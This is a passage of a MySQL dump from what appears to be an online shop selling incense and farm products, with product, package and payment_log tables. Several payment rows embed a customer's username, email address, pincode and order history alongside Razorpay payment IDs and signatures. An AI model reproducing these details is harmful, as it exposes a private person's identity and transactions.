(148, '', 0, 'Chandan Sambrani Cone', '', 'GA/GP/CSC/CSC', 1, 66, 66, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/chandan-sambrani-cone200x24001664455664.jpg', 0, '0', '3562058362684692', 0),
(149, '', 0, 'Jasmine Dhoop Sticks', '', 'PI/JDS/01', 1, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'https://www.gogarbha.com/assets/images/jasmine-dhoop-sticks200x24001664455714.jpg', 0, '0', '5931716301492144', 0),
(150, '', 0, 'Jeevamrutham', '', 'VA/JA/01', 1, 127, 127, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/jeeva-amrutha200x24001658519687.jpg', 0, '', '', 0),
(151, '', 0, 'Pest Control', '', 'VA/PC/01', 1, 85, 85, 0, 0, 110, '500ml', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/pest-control200x24001658519778.jpg', 0, '', '', 0),
(151, '', 0, 'Kewda Dhoop Sticks', '', '0002', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/dhoop-sticks200x24001664455906.jpg', 0, '', '', 0),
(152, '', 0, 'Gugle Dhoop Sticks', '', 'PI/GDS/01', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/gugle-dhoop-sticks200x24001664455691.jpg', 0, '', '', 0),
(153, '', 0, 'Gugle Dhoop Sticks', '', 'PI/GDS/01', 1, 77, 77, 0, 0, 121, 'Pack 1', '', 'Gogarbha', 'https://www.gogarbha.com/assets/images/gugle-dhoop-sticks200x24001664455691.jpg', 0, '', '', 0),
(154, '', 0, 'Gulab Dhoop Sticks', '', 'PI/GLDS/01', 1, 64, 64, 0, 0, 125, '12 Pcs', '', '', 'https://www.gogarbha.com/assets/images/gulab-dhoop-sticks200x24001664455739.jpg', 0, '3.2', '4048801453230527', 0),
(155, '', 0, 'Gugle Sambrani Cone', '', 'GA/GP/CSC/GGSC', 1, 64, 64, 0, 0, 125, '12 Pcs', '', '', 'https://www.gogarbha.com/assets/images/gugler-sambrani-cone200x24001664455615.jpg', 0, '3.2', '6092751252583398', 0),
(156, '', 0, 'Gulab Dhoop Sticks', '', 'PI/GLDS/01', 1, 64, 64, 0, 0, 125, '12 Pcs', '', '', 'https://www.gogarbha.com/assets/images/gulab-dhoop-sticks200x24001664455739.jpg', 0, '3.2', '6574706858505166', 0);

-- --------------------------------------------------------

--
-- Table structure for table `our_products`
--

CREATE TABLE `our_products` (
  `id` int(11) NOT NULL,
  `order_no` int(11) NOT NULL,
  `title` text NOT NULL,
  `sub_title` text NOT NULL,
  `image_path` text NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `our_products`
--

INSERT INTO `our_products` (`id`, `order_no`, `title`, `sub_title`, `image_path`, `user_id`, `created_date`, `modified_date`, `status`) VALUES
(1, 1, 'Plants', 'Description Here', 'assets/our_products/design14389306971.jpg', 1, '0000-00-00 00:00:00', '2015-08-07 12:29:42', 0),
(2, 2, 'Flowers', 'Description Here', 'assets/our_products/design14389308531.jpg', 1, '0000-00-00 00:00:00', '2015-08-07 12:31:04', 0),
(3, 3, 'Bouquets', 'Description Here', 'assets/our_products/design14389309421.jpg', 1, '0000-00-00 00:00:00', '2015-08-07 12:32:22', 0);

-- --------------------------------------------------------

--
-- Table structure for table `packages`
--

CREATE TABLE `packages` (
  `id` int(11) NOT NULL,
  `pname` varchar(200) NOT NULL,
  `status` int(11) NOT NULL,
  `created_date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `packages`
--

INSERT INTO `packages` (`id`, `pname`, `status`, `created_date`) VALUES
(1, 'Gold', 0, '2022-02-11 00:00:00'),
(2, 'Silver', 0, '2022-02-11 00:00:00'),
(3, 'Normal', 0, '2022-02-10 00:00:00'),
(7, 'None', 0, '2022-02-09 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `payment_log`
--

CREATE TABLE `payment_log` (
  `id` int(11) NOT NULL,
  `order_id` varchar(50) NOT NULL,
  `razor_oid` varchar(100) NOT NULL,
  `amount` int(11) NOT NULL,
  `pay_array` text NOT NULL,
  `added_datetime` datetime NOT NULL,
  `modify_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `status` tinyint(2) NOT NULL,
  `pay_id` varchar(100) NOT NULL,
  `signature` varchar(100) NOT NULL,
  `pstatus` varchar(30) NOT NULL,
  `payment_log` text NOT NULL,
  `oid` int(11) NOT NULL,
  `save_resp` varchar(100) NOT NULL,
  `gen_signature` varchar(200) NOT NULL,
  `randid` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `payment_log`
--

INSERT INTO `payment_log` (`id`, `order_id`, `razor_oid`, `amount`, `pay_array`, `added_datetime`, `modify_date`, `status`, `pay_id`, `signature`, `pstatus`, `payment_log`, `oid`, `save_resp`, `gen_signature`, `randid`) VALUES
(1, '77287038013', 'order_IqEDr5AViKfHZa', 0, '', '2022-01-31 10:39:04', '2022-01-31 05:09:04', 1, 'pay_IqEDyuDcaD63sH', '0352c256070080ae589f9d997f20a0e44fb0e59a2cb9fe1b6fbc133f13cc18ff', 'success', '', 2, '', '', ''),
(2, '17096384937', 'order_IqEDmxzPf9r6QC', 0, '', '2022-01-31 10:39:34', '2022-01-31 05:09:34', 1, 'pay_IqEEVIfSho4JYg', '715645b8ba9d95c351709479685a270d76a2c811ce568336a5e19d8f1b0ad68c', 'success', '', 1, '', '', ''),
(3, '70244733942', 'order_IqFWOKylkDbjVb', 0, '', '2022-01-31 11:55:35', '2022-01-31 06:25:35', 1, 'pay_IqFWoCyHR7t89u', '8db4f9d8356462971c3a29fc08b5c51bd0ceac4c6030dcafe2091ae5dd52dc75', 'success', '', 4, '', '', ''),
(4, '16919866950', 'order_IqI2wLUSQ0b6U5', 0, '', '2022-01-31 14:23:31', '2022-01-31 08:53:31', 1, 'pay_IqI33xJPoihLR9', '054b9818dc886d227a9dbfaa58574a4e1df5ba6f3d068cd26c60dd3ebf1b3324', 'success', '', 5, '', '', ''),
(5, '7780014662', 'order_IqINcbTUsCn4yp', 0, '', '2022-01-31 14:43:17', '2022-01-31 09:13:17', 1, 'pay_IqINxEJKmLGxBP', '04e49673b529c7727ba0618b6592a26c30bd8b9d1714979fb9dc871772ca0ec6', 'success', '', 6, '', '', ''),
(6, '46858407172', 'order_IqJYcKnCYd7oNj', 0, '', '2022-01-31 15:52:14', '2022-01-31 10:22:14', 1, 'pay_IqJYm1vZ7ZJFCV', '46c65a4153178a742007429f814c57739f512dc109fb703e0fbf871b610f3536', 'success', '', 13, '', '', ''),
(7, '45444998450', 'order_IqJbBmaPSeYInI', 0, '', '2022-01-31 15:54:38', '2022-01-31 10:24:38', 1, 'pay_IqJbJEzJt9gjPe', '39e4e612d69be5d552be0b9ac05c2cb808a1477fe1bd4c35a2caf12afdb44854', 'success', '', 14, '', '', ''),
(8, '18539288468', 'order_IqJiXJgcj1lJLr', 0, '', '2022-01-31 16:01:41', '2022-01-31 10:31:41', 1, 'pay_IqJilZQCufLFC2', '1cdf98d5d1bae9940619aff002f44d96baf33107392a47eacbcced7ff3daa22b', 'success', '', 15, '', '', ''),
(9, '8875303580', 'order_IqK0bxX4mnO7Xa', 0, '', '2022-01-31 16:18:46', '2022-01-31 10:48:46', 1, 'pay_IqK0n6Z3yHIig9', '372b773af5d0a8b02c35a74ba94d92d0af01e0534065d66479b99baf9a470967', 'success', '', 17, '', '', ''),
(10, '1469131032', 'order_IqK7BHXlcdSs84', 0, '', '2022-01-31 16:24:55', '2022-01-31 10:54:55', 1, 'pay_IqK7JnpMCi7X6D', 'de2db3c617f42089189e7e807c281f54fc90d578d1a1b2cc69751906c2042fd6', 'success', '', 18, '', '', ''),
(11, '78029336405', 'order_IqNHy2IHkDDsIN', 0, '', '2022-01-31 19:31:14', '2022-01-31 14:01:14', 1, 'pay_IqNI7O9NvGVDhN', 'b90541b72c110613330e7c64bad47fb321db8f66bce62dbbf9a5152c3d081d36', 'success', '', 19, '', '', ''),
(12, '25506212706', 'order_IqbA9Forpn5c4a', 0, '', '2022-02-01 09:05:33', '2022-02-01 03:35:33', 1, 'pay_IqbAJQkKweuYlP', '8c2cec162c625d569633a466e46fb9199af8ac4f17da275292c3f009491fe5d1', 'success', '', 20, '', '', ''),
(13, '10085339388', 'order_IqbsvCsDCZFuQX', 0, '', '2022-02-01 09:48:03', '2022-02-01 04:18:03', 1, 'pay_IqbtCmBl6xHI8f', '57a2d285d6430e9b89f8df59e0fb2092990911b87b8bc78aac4dfc5ee5098363', 'success', '', 21, '', '', ''),
(14, '93122627274', 'order_Iqc17LrnOTeamK', 0, '', '2022-02-01 09:55:45', '2022-02-01 04:25:45', 1, 'pay_Iqc1K7wPGgMR7b', '97e4e5a3e0a63ac166de6e406a2231ce751f5919dab39f7b086df65715a3ef47', 'success', '', 22, '', '', ''),
(15, '59001417051', 'order_Iqk3wfwgTPDeb6', 0, '', '2022-02-01 17:48:04', '2022-02-01 12:18:04', 1, 'pay_Iqk4FVaQdmGAKQ', '70b0fee9a63df807f931f140686536edbabe5b1aea3b9794c5c1fa4a41c6e052', 'success', '', 23, '', '', ''),
(16, '12950985856', 'order_IuFE8Sbm0tMMqV', 630, '', '2022-02-10 14:14:30', '2022-02-10 08:44:30', 1, 'pay_IuFElLGDzKrhNC', '4086ab409a650f6ea87a1c89446cc47384c7effab14c190ab8161a98abd41857', 'success', '', 24, '', '', ''),
(17, '81343073322', 'order_IuH9LgoTYSapOk', 210, '', '2022-02-10 16:07:41', '2022-02-10 10:37:41', 1, 'pay_IuHAGw43O7jhd2', '245c7466394cf04e821e8ecaab7417733cc3a0159048676aace0117183b10259', 'success', '', 25, '', '', ''),
(18, '71136618540', 'order_IuHBqB3jLKphM3', 880, '', '2022-02-10 16:09:43', '2022-02-10 10:39:43', 1, 'pay_IuHCSYbNTfX3rL', '8bc4864a8906894eda1a8b404132d77728690c9bd03b79d6e35f72f94b539afc', 'success', '', 30, '', '', ''),
(19, '67288292968', 'order_IvMr0zb4q1KeB5', 1322, '', '2022-02-13 10:21:17', '2022-02-13 04:51:17', 1, 'pay_IvMrjn2mTSnZkI', 'e3c4b5e3bcd2086063371a04edfc55eea0ac5c2a292cccfc50fab798053f3685', 'success', '', 31, '', '', ''),
(20, '89751764194', 'order_IwEDexFqAMt5V2', 45, '', '2022-02-15 14:33:51', '2022-02-15 09:03:51', 1, 'pay_IwEEnWU5kDUtfq', 'e1edf347eb76a18dbf22c7b5c9f9f4791a0b24af041be150b3b884cfa2abf067', 'success', '', 32, '', '', ''),
(21, '16521323734', 'order_IwG6bTDKwQZ2Ro', 45, '', '2022-02-15 16:23:40', '2022-02-15 10:53:40', 1, 'pay_IwG6nBdFdH5t7x', '2b2dfbdb23b3e56216e3cf11f6543ecc555425eb4ef0ec11f56f51561511d401', 'success', '', 33, '', '', ''),
(22, '95555824572', 'order_IwGDmlp7lj05iq', 450, '', '2022-02-15 16:30:25', '2022-02-15 11:00:25', 1, 'pay_IwGDuqeV3c8KYR', 'b98db44c0a23cec5a03f773f48770a24666269dc7df4dcb2fbb74e24df940605', 'success', '', 34, '', '', ''),
(23, '42694508843', 'order_IxRGprEfxBOXZZ', 150, '', '2022-02-18 15:57:58', '2022-02-18 10:27:59', 1, 'pay_IxRH1JHJCx5lk2', 'a3ddb94a24d09ea19579d8c79347ea498a10706b85d0a0f3e0c33d593e86a456', 'success', '', 37, '', '', ''),
(24, '24472546886', 'order_IxW8q4dsZeRF4Q', 360, '', '2022-02-18 20:43:53', '2022-02-18 15:13:53', 1, 'pay_IxW91Mj2sFDiwM', 'f537b06b4ea878b2a0d1c5b2d3080528bee62c2ab0f34db22b290db06b69d64e', 'success', '', 38, '', '', ''),
(25, '32071334630', 'order_IyxdkOQtCWzYIX', 150, '', '2022-02-22 12:17:06', '2022-02-22 06:47:06', 1, 'pay_IyxeBRbi6rGFFF', '2f4a4e52ff62e3327da7002ae78ffe3baca47f7fe088f74396e9eecb8add4b82', 'success', '', 39, '', '', ''),
(26, '18852127773', 'order_IzLKrbGcn0an82', 150, '', '2022-02-23 11:30:29', '2022-02-23 06:00:29', 1, 'pay_IzLMatTjY9e4IE', '2d2b0b4fbc12cadc8aea569b90f86f00ccec0ce49dfca12aee8fbc98d667cc8c', 'success', '', 41, '', '', ''),
(27, '85327797297', 'order_IzM4OEZAfaUyYz', 470, '', '2022-02-23 12:11:06', '2022-02-23 06:41:06', 1, 'pay_IzM4yfEFXpKgDq', '2e3410127c4749e37b42c4d044bdcf8f381f116d3028aac59e80852f282e8236', 'success', '', 42, '', '', ''),
(28, '38415329091', 'order_IzMfxIMhhuK25x', 620, '', '2022-02-23 12:46:34', '2022-02-23 07:16:34', 1, 'pay_IzMgRxBKzl0hUi', 'b68d3aa757e4f9c5516fd1b0d05e818facdafb88360892d20428ebef546b0b32', 'success', '', 43, '', '', ''),
(29, '63698480853', 'order_IzNyh1Ib2RXMX7', 300, '', '2022-02-23 14:02:44', '2022-02-23 08:32:44', 1, 'pay_IzNyt08rFbcGJ3', 'aa786beec0dcadd59d13c805fcb0153330e64caf831b3e91dd6a3c2ee231d9e8', 'success', '', 44, '', '', ''),
(30, '74913330605', 'order_IzOyH6ldjbidem', 463, '', '2022-02-23 15:01:00', '2022-02-23 09:31:00', 1, 'pay_IzOyQzon068lGa', '02f10f78d89756c4875a5dd6078108638328f9b562c4053488d87af49067f8e7', 'success', '', 45, '', '', ''),
(31, '11391002009', 'order_IzP4CPq8gtpOpg', 313, '', '2022-02-23 15:06:41', '2022-02-23 09:36:41', 1, 'pay_IzP4QtBYgZMFeo', '23624274643253a3a60606e7b4f4da8804613cc1cd56b4b29e74531272db79f9', 'success', '', 46, '', '', ''),
(32, '57599278433', 'order_IzqNBFvGLy4TF6', 300, '', '2022-02-24 17:49:37', '2022-02-24 12:19:37', 1, 'pay_IzqNfZM1t8nsp1', '8ae3be3e7126384e40d0cf02f9e808db340a563375c880828741abcae96807d8', 'success', '', 53, '', '', ''),
(33, '76453984532', 'order_J1QjUO0IVwBNUi', 430, '', '2022-02-28 18:02:54', '2022-02-28 12:32:54', 1, 'pay_J1Qk4dnoFSaY7j', 'bdb4959947fb2b3343907925bab877f30b06b5d52e730e7d2c179789f7edcf4f', 'success', '', 57, '', '', ''),
(34, '68266509214', 'order_J1lMzejifSPlsJ', 850, '', '2022-03-01 14:13:56', '2022-03-01 08:43:56', 1, 'pay_J1lNRFh8dbJtKC', '436a95b6db753df08bb4e1890535dd34763b4562bb822a9dec74cc71484d9f52', 'success', '', 68, '', '', ''),
(35, '34298929794', 'order_J1mcVs3epA8MC2', 326, '', '2022-03-01 15:27:03', '2022-03-01 09:57:03', 1, 'pay_J1mcfl1f1IBQBc', 'c6d747cbfc08c2fdbbb22a8fad2ae5d71f0430ab4f2577159358f3caa1f7405d', 'success', '', 71, '', '', ''),
(36, '21669379055', 'order_J1mdw8WAETrFbV', 800, '', '2022-03-01 15:28:25', '2022-03-01 09:58:25', 1, 'pay_J1me7GyOIlQ7hg', 'a02756e7e3a90841fe123a0b54ec69d72e06f01a8b885c6869874381bd6c0d7e', 'success', '', 73, '', '', ''),
(37, '38804601685', 'order_J26A9sNjlnl6rp', 250, '', '2022-03-02 10:35:10', '2022-03-02 05:05:10', 1, 'pay_J26BSuaeZvj2Kp', '7b338c08115a4ab48321f4cd274e44c8c0ed329f8650a7065c83394044bc6b2f', 'success', '', 77, '', '', ''),
(38, '19387332421', 'order_J26taag1gyIVd2', 1500, '', '2022-03-02 11:17:06', '2022-03-02 05:47:06', 1, 'pay_J26tlP2kv97JFd', '0cfa040d9cfdcf30ab72a8866b6a076cc6b695eea5db317492956e18e11d6ad0', 'success', '', 78, '', '', ''),
(39, '88849734279', 'order_J27b7qHOmz8nZf', 4160, '', '2022-03-02 11:58:40', '2022-03-02 06:28:40', 1, 'pay_J27bgX5Sme9qct', 'e03c70c336378a41facc2b51cab432d1d78b1fe6194438cf748cec3d713d32b5', 'success', '', 80, '', '', ''),
(40, '91606709756', 'order_J28O7Ptl0qCvVS', 500, '', '2022-03-02 12:45:21', '2022-03-02 07:15:21', 1, 'pay_J28P0I7YEpoVVi', '2edcfec1843128b8319814c74e9f92a7d935e65eb2185763b8543450ace03d7b', 'success', '', 81, '', '', ''),
(41, '47302744374', 'order_J28fUvcOKjEjv2', 340, '', '2022-03-02 13:01:44', '2022-03-02 07:31:44', 1, 'pay_J28gIrS1ifhuaW', '41a7dab0ab63cd1bdadb4e49672fab3134f464403fc1db595e76500dfd898157', 'success', '', 82, '', '', ''),
(42, '19889675547', 'order_J2BP5ZtZP7HBUP', 850, '', '2022-03-02 15:41:59', '2022-03-02 10:11:59', 1, 'pay_J2BPaZb3rfw7yt', '9f2bcc4950d3a62bfa3c3fdd7c4a3fa2ec8919f8cc07b612023b1eec7855587d', 'success', '', 83, '', '', ''),
(43, '9401619', 'order_J2BYm0WJIq4kQC', 1320, '{\"txnid\":\"a884a4543aeced9173fb\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":5,\"total_amt\":\"1270.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"400\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"1320.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-02 15:50:37\",\"delivery_date\":\"2022-03-06\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":26780424,\"discount_per\":\"00\"}', '2022-03-02 15:50:37', '2022-03-02 10:20:37', -1, '', '', '', '', 85, '', '', ''),
(44, '3320625', 'order_J2Bbh2n358Njza', 1320, '{\"txnid\":\"510a4dacbbc74d4dda83\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":5,\"total_amt\":\"1270.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"400\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"1320.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-02 15:53:22\",\"delivery_date\":\"2022-03-06\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":84349227,\"discount_per\":\"00\"}', '2022-03-02 15:53:23', '2022-03-02 10:23:23', -1, '', '', '', '', 87, '', '', ''),
(45, '1969107', 'order_J2Bbt6f44wXmxb', 1320, '{\"txnid\":\"db7b44d58905903b1d2f\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":5,\"total_amt\":\"1270.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"400\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"1320.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-02 15:53:34\",\"delivery_date\":\"2022-03-06\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":80853709,\"discount_per\":\"00\"}', '2022-03-02 15:53:34', '2022-03-02 10:23:34', -1, '', '', '', '', 88, '', '', ''),
(46, '7369351', 'order_J2BdjkY90KXEKs', 1320, '{\"txnid\":\"b5e7ee86ab27edbef304\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":5,\"total_amt\":\"1270.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"400\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"1320.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-02 15:55:19\",\"delivery_date\":\"2022-03-06\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":69554943,\"discount_per\":\"00\"}', '2022-03-02 15:55:19', '2022-03-02 10:25:19', -1, '', '', '', '', 89, '', '', ''),
(47, '6093695', 'order_J2BxEd4kE5H8yg', 1100, '{\"txnid\":\"8273488427fd7d8265e2\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":5,\"total_amt\":\"1050.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"400\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"1100.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-02 16:13:46\",\"delivery_date\":\"2022-03-06\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":93448456,\"discount_per\":\"00\"}', '2022-03-02 16:13:47', '2022-03-02 10:43:47', -1, 'pay_J2ByBQXBkRGzNS', '22bf6ed99d5fb3a5d92b2e9cfbfa2edbcd193de034b281fcf511b4cf70c2b9d9', 'success', '', 90, '', '', ''),
(48, '5277332', 'order_J2D8LoyAD4T4GS', 1100, '{\"txnid\":\"ec59005967ee10ad4cb1\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":5,\"total_amt\":\"1050.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"400\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"1100.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-02 17:22:59\",\"delivery_date\":\"2022-03-06\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":49741773,\"discount_per\":\"00\"}', '2022-03-02 17:23:00', '2022-03-02 11:53:00', -1, 'pay_J2D8XTBxjn0kMu', '5d00cdf2fc521cc9aaf6fb0ae966db6120611f9f3ed1965c4c42c9e719ed262b', 'success', '', 91, '', '', ''),
(49, '28180981351', 'order_J2UTdC1fKxCcOi', 163, '', '2022-03-03 10:21:43', '2022-03-03 04:51:43', 1, 'pay_J2UUN1N1vKlArT', 'b70f226462f3662ec679e75a46448aee87a38b348351540fb777ea91ebeeab21', 'success', '', 92, '', '', ''),
(50, '87598458060', 'order_J2Uy829Tlibjou', 150, '', '2022-03-03 10:50:16', '2022-03-03 05:20:16', 1, 'pay_J2UyXMt1ZrQmgd', '72747122e043f816242d952655fa25854efe9c3072a6d9ed5a585a110a4aa66b', 'success', '', 93, '', '', ''),
(51, '31298768593', 'order_J2V7WrSW1QBAas', 450, '', '2022-03-03 10:59:29', '2022-03-03 05:29:29', 1, 'pay_J2V8HR1bfVXZa4', 'a4ce0b264d32e5eb15edb1693f7d8947c91ff2be4280363cb7bce8734f1873fa', 'success', '', 94, '', '', ''),
(52, '13810379715', 'order_J2WStdgH0VdBBe', 1720, '', '2022-03-03 12:18:25', '2022-03-03 06:48:25', 1, 'pay_J2WTaBqxPp13S4', 'b590e8bde27326ab0fd43810abfc83840f3e654e2cc2ccb04c0265a255962632', 'success', '', 95, '', '', ''),
(53, '15502720729', 'order_J2egBnv1380QMQ', 150, '', '2022-03-03 20:20:38', '2022-03-03 14:50:38', 1, 'pay_J2eh2TbEL1TZXy', '0aef602813edbf1128ae3124402a7ef15e5ac6ad1f836c8ffc9fcad5add36c56', 'success', '', 96, '', '', ''),
(54, '68457636759', 'order_J2tqrAt6Af9BVs', 150, '', '2022-03-04 11:10:52', '2022-03-04 05:40:52', 1, 'pay_J2trPusTFIvLPG', 'a1dd137219a8c0cda3260ecddaf4fbefa2a18be151e03099a0834eb94a428923', 'success', '', 97, '', '', ''),
(55, '35900367258', 'order_J32tTQrEVoA1oS', 250, '', '2022-03-04 20:01:28', '2022-03-04 14:31:28', 1, 'pay_J32tuFLClXZSVv', 'a7a2d5a4bdbb1697eec4bcf0ae82c465eaff899023544e2951223a33029bdeff', 'success', '', 98, '', '', ''),
(56, '36936489962', 'order_J46ylmI8cNwc1e', 163, '', '2022-03-07 12:42:20', '2022-03-07 07:12:20', 1, 'pay_J471PIDwRYvqLl', '9b0a2fffdbe96b399b596e845f93abf778a2ad454ae1e761dcc1c66811a3daca', 'success', '', 99, '', '', ''),
(57, '5053999', 'order_J479qc8OG3UEk6', 920, '{\"txnid\":\"58e21941c44c9ba1b98e\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":4,\"total_amt\":\"870.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"60\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"920.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-07 12:50:15\",\"delivery_date\":\"2022-03-11\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":18921513,\"discount_per\":\"00\"}', '2022-03-07 12:50:15', '2022-03-07 07:20:15', -1, 'pay_J47AXoIGhgEifh', '7dff0f12263464c9db6a7e12416a3b8871fe559f5e7ab3dfb5023e8f16af3d2d', 'success', '', 101, '', '', ''),
(58, '6540978', 'order_J4BqUrhUEiNojF', 890, '{\"txnid\":\"f06d104d51aa9de61dbe\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":2,\"total_amt\":\"840.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"60\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"890.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-07 17:25:24\",\"delivery_date\":\"2022-03-11\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":59984254,\"discount_per\":\"00\"}', '2022-03-07 17:25:24', '2022-03-07 11:55:24', -1, 'pay_J4BqfuHrf8wQ8X', '7466c45d726827223d3220a2f6172f80ad5cd79fe225956e0f6b17c040bfba71', 'success', '', 102, '', '', ''),
(59, '90491415337', 'order_J4ToLvnlrBFthW', 450, '', '2022-03-08 11:00:22', '2022-03-08 05:30:22', 1, 'pay_J4ToohURSRAesn', '5b95bafe51a0366aed7a018f0c8443ca86203c43359ee219b9c77f1edf29e30b', 'success', '', 103, '', '', ''),
(60, '39572975261', 'order_J4U3VqJYNFWRnj', 300, '', '2022-03-08 11:15:31', '2022-03-08 05:45:31', 1, 'pay_J4U4pnG8RB5RDc', 'a3398621efba6a804345c2fb35a5b7da1a1c2d8054436d4ba3a3e7d088ba02eb', 'success', '', 112, '', '', ''),
(61, '99174731563', 'order_J4Uk8XMlff8jiI', 230, '', '2022-03-08 11:55:17', '2022-03-08 06:25:17', 1, 'pay_J4Ukq4FO85dfMF', '37087d843e9f75d30356782dffcc0d0d3c5c2ff0280bee9c4c31bfa6d84c7193', 'success', '', 114, '', '', ''),
(62, '17539236561', 'order_J4UlnKsqWl6MNt', 420, '', '2022-03-08 11:56:47', '2022-03-08 06:26:47', 1, 'pay_J4UmQqlc5UR6gE', 'ef96e520cc65b58ce74db8c6b0156e37792cb348401c5dfb48b795ea9b96a22b', 'success', '', 115, '', '', ''),
(63, '94388628817', 'order_J4VGqOqEej7lny', 875, '', '2022-03-08 12:26:04', '2022-03-08 06:56:04', 1, 'pay_J4VHKp3kHdhBDV', '710c257be050ebe4bfbc2d5f82c8d18414a48779ed5261e199671b3d74447414', 'success', '', 116, '', '', ''),
(64, '5892583', 'order_J4YPTMe7TdkazI', 998, '{\"txnid\":\"d1727ef1dce17a8a804a\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":4,\"total_amt\":\"930.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"320\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"998.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-08 15:29:46\",\"delivery_date\":\"2022-03-12\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"18.00\",\"pincode\":\"560010\",\"randid\":43970307,\"discount_per\":\"00\"}', '2022-03-08 15:29:46', '2022-03-08 09:59:46', -1, 'pay_J4YPg8ELiyzk9Z', 'f1e107040a6ebff4d0e674f481247f623a40df69b7c75176dbd493383880d894', 'success', '', 117, '', '', ''),
(65, '6229323', 'order_J4qpOeqPe1kLEk', 300, '{\"txnid\":\"000627568cfa73ad05ef\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":1,\"total_amt\":\"250.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"100\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"300.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-09 09:30:47\",\"delivery_date\":\"2022-03-13\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":88316994,\"discount_per\":\"00\"}', '2022-03-09 09:30:48', '2022-03-09 04:00:48', -1, 'pay_J4qpeuyxdaGKWa', 'cf45b6a0b89c36651328a7d7b70f66dafdeab7a9c4aa58caac41e03fb85d16bd', 'success', '', 122, '', '', ''),
